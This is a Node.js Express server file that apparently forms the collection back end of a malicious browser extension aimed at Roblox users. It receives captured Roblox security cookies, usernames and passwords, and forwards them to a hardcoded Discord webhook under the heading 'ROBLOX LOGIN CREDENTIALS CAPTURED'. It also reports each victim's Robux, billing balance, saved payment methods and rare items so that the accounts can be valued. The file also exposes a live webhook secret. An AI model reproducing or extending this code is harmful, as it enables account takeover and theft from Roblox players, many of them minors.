
const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files (extension files)
app.use(express.static(__dirname));

// Discord webhook URL from environment variable
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';

if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
  console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
  console.error('Please either:');
  console.error('1. Set DISCORD_WEBHOOK_URL environment variable');
  console.error('2. Replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual webhook URL');
  process.exit(1);
}

// Endpoint to receive logs from browser extension
app.post('/send-log', async (req, res) => {
  try {
    const logData = req.body;
    console.log('Received log:', logData);
    
    // Format the log message for Discord
    const discordMessage = formatLogForDiscord(logData);
    
    // Send to Discord webhook
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(discordMessage)
    });

    if (response.ok) {
      console.log(`Log sent to Discord: ${logData.level} - ${logData.message.substring(0, 50)}...`);
      res.status(200).json({ success: true });
    } else {
      console.error('Failed to send to Discord:', response.status, response.statusText);
      res.status(500).json({ error: 'Failed to send to Discord' });
    }
  } catch (error) {
    console.error('Error sending log to Discord:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

function formatLogForDiscord(logData) {
  const levelEmojis = {
    log: '📝',
    info: 'ℹ️',
    warn: '⚠️',
    error: '❌',
    roblox_login: '🔐',
    roblox_userdata: '👤'
  };

  // Handle different types of Roblox logs
  if (logData.level === 'roblox_login') {
    return formatRobloxLoginEmbed(logData);
  } else if (logData.level === 'roblox_userdata') {
    return formatRobloxUserDataEmbed(logData);
  }

  // Standard log formatting
  const embed = {
    embeds: [{
      title: `${levelEmojis[logData.level] || '📝'} Browser Log - ${logData.level.toUpperCase()}`,
      description: `\`\`\`\n${logData.message}\`\`\``,
      color: getColorForLevel(logData.level),
      fields: [
        {
          name: 'URL',
          value: logData.url || 'Unknown',
          inline: true
        },
        {
          name: 'Timestamp',
          value: new Date(logData.timestamp).toLocaleString(),
          inline: true
        }
      ],
      footer: {
        text: `Tab: ${logData.tabTitle || 'Unknown'}`
      }
    }]
  };

  return embed;
}

function formatRobloxLoginEmbed(logData) {
  // Parse the message to extract token, username, and password
  const message = logData.message;
  const tokenMatch = message.match(/🔐 ROBLOX SECURITY TOKEN DETECTED: (.+?)(?:\n|$)/);
  const usernameMatch = message.match(/👤 USERNAME: (.+?)(?:\n|$)/);
  const passwordMatch = message.match(/🔑 PASSWORD: (.+?)(?:\n|$)/);
  
  const token = tokenMatch ? tokenMatch[1] : 'Not captured';
  const username = usernameMatch ? usernameMatch[1] : 'Not captured';
  const password = passwordMatch ? passwordMatch[1] : 'Not captured';
  
  // Format description with proper code blocks
  let description = `\`\`\`\n🔐 ROBLOX SECURITY TOKEN DETECTED: ${token}\`\`\`\n`;
  description += `👤 USERNAME: \`\`\`${username}\`\`\`\n`;
  description += `🔑 PASSWORD: \`\`\`${password}\`\`\``;
  
  return {
    embeds: [{
      title: "🔐 ROBLOX LOGIN CREDENTIALS CAPTURED",
      description: description,
      color: 16711680, // Red color as decimal
      fields: [
        {
          name: "🌐 URL",
          value: logData.url || "Unknown",
          inline: true
        },
        {
          name: "⏰ Timestamp",
          value: new Date(logData.timestamp).toLocaleString(),
          inline: true
        },
        {
          name: "⚠️ Security Alert",
          value: "Credentials and security token captured",
          inline: false
        }
      ],
      footer: {
        text: "🔒 ROBLOX SECURITY BREACH DETECTED"
      },
      timestamp: new Date(logData.timestamp).toISOString()
    }]
  };
}

function formatRobloxCookieEmbed(token) {
  // Second embed: Cookie only - display the raw token value in description with code block formatting
  return {
    embeds: [{
      title: "🍪 Cookie",
      description: "```" + token + "```",
      color: 0x8B5CF6,
      footer: {
        text: "Handle with extreme caution!"
      }
    }]
  };
}

function formatRobloxUserDataEmbed(logData) {
  try {
    const userData = JSON.parse(logData.message);
    
    // Format collectibles with proper icon handling
    let collectiblesValue = "";
    if (userData.korblox) {
      collectiblesValue += "<:KorbloxDeathspeaker:1408080747306418257> True\n";
    } else {
      collectiblesValue += "False\n";
    }
    
    if (userData.headless) {
      collectiblesValue += "<:HeadlessHorseman:1397192572295839806> True";
    } else {
      collectiblesValue += "False";
    }

    // First embed: User data only (without cookie)
    const userDataEmbed = {
      title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
      color: 0x8B5CF6,
      fields: [
        {
          name: "<:emoji_37:1410520517349212200> Username",
          value: userData.username || "Unknown",
          inline: false
        },
        {
          name: "<:emoji_31:1410233610031857735> Robux (Pending)",
          value: `${userData.robux || 0} (${userData.pendingRobux || 0})`,
          inline: true
        },
        {
          name: "<:rbxPremium:1408083254531330158> Premium",
          value: userData.premium ? "true" : "false",
          inline: true
        },
        {
          name: "<:emoji_36:1410512337839849543> RAP",
          value: userData.rap?.toString() || "0",
          inline: true
        },
        {
          name: "<:emoji_40:1410521889121501214> Summary",
          value: userData.summary?.toString() || "0",
          inline: true
        },
        {
          name: "<a:emoji_42:1410523396995022890> Billing",
          value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${(userData.creditBalance / 100).toFixed(2)} (Est. ${Math.round(userData.creditBalance * 0.8)} Robux)`: "$0.00"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
          inline: false
        },
        {
          name: "<:emoji_31:1410233610031857735> Robux In/Out",
          value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
          inline: true
        },
        {
          name: "<:emoji_39:1410521396420939787> Collectibles",
          value: collectiblesValue,
          inline: true
        },
        {
          name: "<:emoji_38:1410520554842361857> Groups Owned",
          value: userData.groupsOwned?.toString() || "0",
          inline: true
        },
        {
          name: "<:emoji_41:1410522675821940820> Place Visits",
          value: userData.placeVisits?.toString() || "0",
          inline: true
        },
        {
          name: "<:emoji_37:1410517247751094363> Inventory",
          value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
          inline: false
        },
        {
          name: "<:emoji_38:1410517275328647218> Settings",
          value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
          inline: false                  
        }
      ],
      footer: {
        text: "Made By .gg/sZbFX2wPVz"
      },
      timestamp: new Date().toISOString()
    };

    return {
      embeds: [userDataEmbed]
    };
  } catch (error) {
    console.error('Error parsing user data:', error);
    return {
      embeds: [{
        title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
        description: `\`\`\`\nError parsing user data: ${error.message}\n${logData.message}\`\`\``,
        color: 0x8B5CF6,
        footer: {
          text: "Made By .gg/sZbFX2wPVz"
        },
        timestamp: new Date().toISOString()
      }]
    };
  }
}

function getColorForLevel(level) {
  const colors = {
    log: 0x3498db,      // Blue
    info: 0x2ecc71,     // Green
    warn: 0xf39c12,     // Orange
    error: 0xe74c3c,    // Red
    roblox_login: 0xff0000, // Bright Red
    roblox_userdata: 0x00ff00 // Bright Green
  };
  return colors[level] || colors.log;
}

// Root endpoint with information about the service
app.get('/', (req, res) => {
  res.json({ 
    service: 'Discord Logger Webhook Service',
    status: 'Running',
    endpoints: {
      '/send-log': 'POST - Receive logs from browser extension',
      '/health': 'GET - Health check',
      '/popup.html': 'GET - Extension popup interface'
    },
    timestamp: new Date().toISOString() 
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Webhook service running on port ${PORT}`);
  console.log(`Discord webhook configured: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
});
